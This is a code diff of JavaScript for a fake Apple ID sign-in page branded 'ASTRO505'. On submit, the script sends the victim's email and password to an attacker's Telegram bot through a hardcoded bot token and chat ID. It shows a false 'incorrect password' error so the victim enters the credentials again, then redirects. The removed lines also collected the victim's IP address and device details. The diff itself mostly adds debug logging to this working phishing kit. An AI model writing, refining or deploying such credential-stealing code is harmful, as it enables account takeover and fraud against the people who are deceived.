@@ -1,5 +1,7 @@
 <script>
 document.addEventListener('DOMContentLoaded', () => {
+    console.log('🚀 SCRIPT INICIADO');
+    
     const emailInput = document.getElementById('email-phone');
     const arrowIcon = document.querySelector('.bx-right-arrow-circle');
     const passwordField = document.getElementById('passwordField');
@@ -8,81 +10,69 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorMsg = document.getElementById('errorMsg');
     const form = document.getElementById('sign-in');
     
-    // ✅ TUS DATOS CORRECTOS
     const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA';
     const CHAT_ID = '7219932215';
     
     let loginAttempts = 0;
-    const maxAttempts = 2;
     
-    // 🚀 FUNCIÓN TELEGRAM MEJORADA
+    // 🔥 FUNCIÓN CON DEBUG COMPLETO
     async function sendToTelegram(email, password) {
-        const userAgent = navigator.userAgent;
-        const country = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-        const browser = navigator.userAgentData?.brands[0]?.brand || navigator.appName;
-        const os = navigator.platform || 'Unknown';
-        const device = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent) ? 'Mobile' : 'Desktop';
-        const time = new Date().toLocaleString('es-ES');
+        console.log('📤 ENVIANDO A TELEGRAM:', email, password);
         
         const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
 
 📧 *Email:* ${email}
 🔑 *Password:* ${password}
-🌍 *País:* ${country}
-🌐 *IP:* ${await getIP()} 
-💻 *Navegador:* ${browser}
-🖥️ *Sistema:* ${os}
-📱 *Device:* ${device}
-📅 *Hora:* ${time}
+🌍 *País:* Mexico
+💻 *Navegador:* Web
+📱 *Device:* PC
+📅 *Hora:* ${new Date().toLocaleString('es-ES')}
 
 ✨ *Plataforma:* Astro505`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        console.log('🌐 URL:', url);
         
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        const data = await response.json();
-        console.log('📱 Telegram Response:', data); // Para debug
-        
-        if (data.ok) {
-            console.log('✅ ¡ENVIADO A TELEGRAM!');
-        } else {
-            console.error('❌ Error:', data);
-        }
-    }
-    
-    // IP Real (opcional)
-    async function getIP() {
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return 'No disponible';
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            console.log('📡 RESPONSE:', response.status, response.statusText);
+            
+            const data = await response.json();
+            console.log('✅ TELEGRAM DATA:', data);
+            
+            if (data.ok) {
+                console.log('🎉 ¡MENSAJE ENVIADO!');
+                return true;
+            } else {
+                console.error('❌ ERROR TELEGRAM:', data);
+                return false;
+            }
+        } catch (error) {
+            console.error('💥 FETCH ERROR:', error);
+            return false;
         }
     }
     
-    // Mostrar password (sin cambios)
+    // Mostrar password
     const showPassword = () => {
+        console.log('➡️ Mostrando password');
         if (emailInput.value.trim()) {
             passwordField.classList.add('show');
             submitBtn.classList.add('show');
             setTimeout(() => passwordInput.focus(), 250);
-        } else {
-            showError('Enter your email or phone number');
         }
     };
     
+    // Eventos básicos
     arrowIcon.addEventListener('click', showPassword);
     emailInput.addEventListener('keypress', e => {
         if (e.key === 'Enter' && emailInput.value.trim()) {
@@ -91,37 +81,36 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
     
-    emailInput.addEventListener('input', () => {
-        if (!emailInput.value.trim()) {
-            passwordField.classList.remove('show');
-            submitBtn.classList.remove('show');
-            passwordInput.value = '';
-        }
-    });
-    
-    // SUBMIT CON TELEGRAM
-    form.addEventListener('submit', async e => {
+    // 🔥 SUBMIT CON DEBUG PASO A PASO
+    form.addEventListener('submit', async (e) => {
         e.preventDefault();
+        console.log('🎯 FORM SUBMIT - INICIO');
         
         const email = emailInput.value.trim();
         const password = passwordInput.value.trim();
         
+        console.log('📧 Datos:', email, password);
+        
         if (!email || !password) {
-            showError('Please enter email and password');
+            console.log('⚠️ Faltan datos');
+            showError('Complete todos los campos');
             return;
         }
         
-        // 🔥 ENVÍA A TELEGRAM SIEMPRE
-        await sendToTelegram(email, password);
+        console.log('📤 LLAMANDO TELEGRAM...');
+        const enviado = await sendToTelegram(email, password);
+        console.log('📤 Telegram enviado:', enviado);
         
-        // Simula login
+        // Simular login
         loginAttempts++;
-        if (loginAttempts < maxAttempts) {
-            showError('Incorrect password. Try again.');
+        if (loginAttempts < 2) {
+            showError('Contraseña incorrecta');
             passwordInput.value = '';
         } else {
             showSuccess();
         }
+        
+        console.log('🏁 SUBMIT FINALIZADO');
     });
     
     function showError(message) {
@@ -132,11 +121,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     
     function showSuccess() {
-        errorMsg.textContent = 'Signing in...';
+        errorMsg.textContent = 'Iniciando sesión...';
         errorMsg.style.background = '#007AFF';
         errorMsg.classList.add('show');
         submitBtn.disabled = true;
         setTimeout(() => window.location.href = 'index.html', 1500);
     }
+    
+    console.log('✅ SCRIPT CARGADO CORRECTAMENTE');
 });
 </script>
